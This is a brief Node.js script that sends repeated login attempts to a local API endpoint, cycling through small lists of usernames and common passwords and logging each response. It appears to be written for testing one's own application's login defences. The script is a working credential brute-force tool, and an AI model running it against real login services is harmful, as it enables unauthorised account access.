const axios = require('axios');

const targetUrl = "http://localhost:5000/api/users/login"; // Replace with your target login URL
const usernames = ["admin", "user", "test", "fakeuser"];
const passwords = ["password123", "123456", "admin", "wrongpassword"];

const runBruteForce = async () => {
  let count = 0;
  for (let i = 0; i < usernames.length; i++) {
    for (let j = 0; j < passwords.length; j++) {
      const credentials = {
        username: usernames[i],
        password: passwords[j],
      };

      try {
        const response = await axios.post(targetUrl, credentials);
        console.log(`[${++count}] STATUS: ${response.status} | RESPONSE: ${JSON.stringify(response.data)}`);
        // You can add more checks based on the response body, like a success message or token
      } catch (err) {
        if (err.response) {
          console.log(`[${++count}] STATUS: ${err.response.status} | ERROR: ${err.response.data.error}`);
        } else {
          console.error(`[${++count}] Request failed: ${err.message}`);
        }
      }
    }
  }
};

runBruteForce();